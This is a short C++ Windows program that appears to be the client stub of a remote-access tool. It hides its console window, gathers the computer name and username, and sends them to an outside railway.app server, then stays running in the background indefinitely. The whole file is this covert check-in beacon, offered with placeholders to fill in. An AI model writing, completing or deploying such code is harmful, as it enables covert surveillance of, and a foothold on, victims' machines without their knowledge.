#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>

#pragma comment(lib, "wininet.lib")

// Replace these with actual values
#define SERVER_URL "wss://glistening-mindfulness.up.railway.app"
#define USER_UID "PLACEHOLDER_UID"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    // Get computer info
    char computerName[256] = {0};
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    char username[256] = {0};
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    // Test internet connection
    HINTERNET hInternet = InternetOpenA("GROB Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "glistening-mindfulness.up.railway.app", 
                                            INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, 
                                            INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // Send initial connection info
            std::string postData = "uid=" + std::string(USER_UID) + 
                                 "&computer=" + std::string(computerName) + 
                                 "&username=" + std::string(username);
            
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/connect", 
                                               NULL, NULL, NULL, 0, 0);
            if (hRequest) {
                HttpAddRequestHeadersA(hRequest, "Content-Type: application/x-www-form-urlencoded\r\n", -1, 0);
                HttpSendRequestA(hRequest, NULL, 0, (LPVOID)postData.c_str(), postData.length());
                
                // Keep connection alive
                Sleep(1000);
                
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    
    // Keep process running
    while (true) {
        Sleep(60000); // Sleep for 1 minute
    }
    
    return 0;
}
